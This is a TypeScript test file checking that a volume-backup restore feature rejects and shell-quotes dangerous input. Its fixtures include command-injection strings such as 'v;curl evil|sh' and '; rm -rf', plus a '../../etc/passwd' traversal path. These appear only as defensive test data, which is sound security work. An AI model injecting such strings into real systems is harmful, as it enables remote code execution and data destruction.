import { quote } from "shell-quote";
import { describe, expect, it } from "vitest";
import { restoreVolumeBackupSchema } from "@/server/core/db/schema";
import { buildVolumeRestoreScript } from "@/server/core/utils/volume-backups/restore";

// Values that, interpolated naively into a shell command, would break out and
// run an extra command. The schema rejects them at the boundary; the command
// builder still quotes every use site so future callers do not accidentally
// reintroduce raw interpolation.
const MALICIOUS_VOLUME_NAME = "v;curl evil|sh";
const MALICIOUS_BACKUP_FILE = "backups/b.tar; rm -rf";

const baseRestoreInput = {
	backupFileName: "app/prefix/myvolume-2024.tar",
	destinationId: "dest_1",
	volumeName: "myvolume",
	id: "svc_1",
	serviceType: "application" as const,
};

describe("volume-restore boundary: restoreVolumeBackupSchema", () => {
	it("rejects a malicious volumeName at the Zod boundary", () => {
		const result = restoreVolumeBackupSchema.safeParse({
			...baseRestoreInput,
			volumeName: MALICIOUS_VOLUME_NAME,
		});
		expect(result.success).toBe(false);
	});

	it("rejects a malicious backupFileName at the Zod boundary", () => {
		const result = restoreVolumeBackupSchema.safeParse({
			...baseRestoreInput,
			backupFileName: MALICIOUS_BACKUP_FILE,
		});
		expect(result.success).toBe(false);
	});

	it("rejects a backupFileName containing traversal", () => {
		const result = restoreVolumeBackupSchema.safeParse({
			...baseRestoreInput,
			backupFileName: "../../etc/passwd",
		});
		expect(result.success).toBe(false);
	});

	it("rejects a backupFileName of '..'", () => {
		const result = restoreVolumeBackupSchema.safeParse({
			...baseRestoreInput,
			backupFileName: "..",
		});
		expect(result.success).toBe(false);
	});

	it("rejects a backupFileName that is not a tar object", () => {
		const result = restoreVolumeBackupSchema.safeParse({
			...baseRestoreInput,
			backupFileName: "app/prefix/myvolume-2024.zip",
		});
		expect(result.success).toBe(false);
	});

	it("accepts legitimate volumeName and nested backupFileName", () => {
		const result = restoreVolumeBackupSchema.safeParse(baseRestoreInput);
		expect(result.success).toBe(true);
	});
});

describe("volume-restore exec site: buildVolumeRestoreScript", () => {
	const buildWith = (
		volumeName: string,
		backupFileName: string,
		localBackupFileName = backupFileName.split("/").pop() ?? backupFileName,
	) =>
		buildVolumeRestoreScript({
			volumeName,
			backupFileName,
			localBackupFileName,
			volumeBackupPath: "/etc/docklands/volume-backups/myvolume",
			downloadCommand: `rclone copyto ${quote(["src"])} ${quote(["dst"])}`,
			headerLines: ["=== VOLUME RESTORE ==="],
		});

	it("quotes malicious volume names at every command-use site", () => {
		const script = buildWith(MALICIOUS_VOLUME_NAME, "ok.tar");
		expect(script).toContain(
			`-v ${quote([`${MALICIOUS_VOLUME_NAME}:/volume_data`])}`,
		);
		expect(script).toContain(
			`--filter ${quote([`volume=${MALICIOUS_VOLUME_NAME}`])}`,
		);
		expect(script).toContain(
			`docker volume rm ${quote([MALICIOUS_VOLUME_NAME])}`,
		);
		expect(script).not.toContain(`-v ${MALICIOUS_VOLUME_NAME}:/volume_data`);
		expect(script).not.toContain(`--filter volume=${MALICIOUS_VOLUME_NAME}`);
	});

	it("quotes malicious backup filenames inside the tar command", () => {
		const localBackupFileName = "b.tar; rm -rf";
		const script = buildWith(
			"myvolume",
			MALICIOUS_BACKUP_FILE,
			localBackupFileName,
		);
		expect(script).toContain(
			`bash -c ${quote([
				`cd /volume_data && tar xvf ${quote([`/backup/${localBackupFileName}`])} .`,
			])}`,
		);
		expect(script).not.toContain(`tar xvf /backup/${localBackupFileName}`);
	});

	it("still produces a usable command for benign input", () => {
		const script = buildWith("myvolume", "app/prefix/myvolume-2024.tar");
		expect(script).toContain("docker run --rm");
		expect(script).toContain(quote(["myvolume:/volume_data"]));
		expect(script).toContain("tar xvf /backup/myvolume-2024.tar");
	});
});
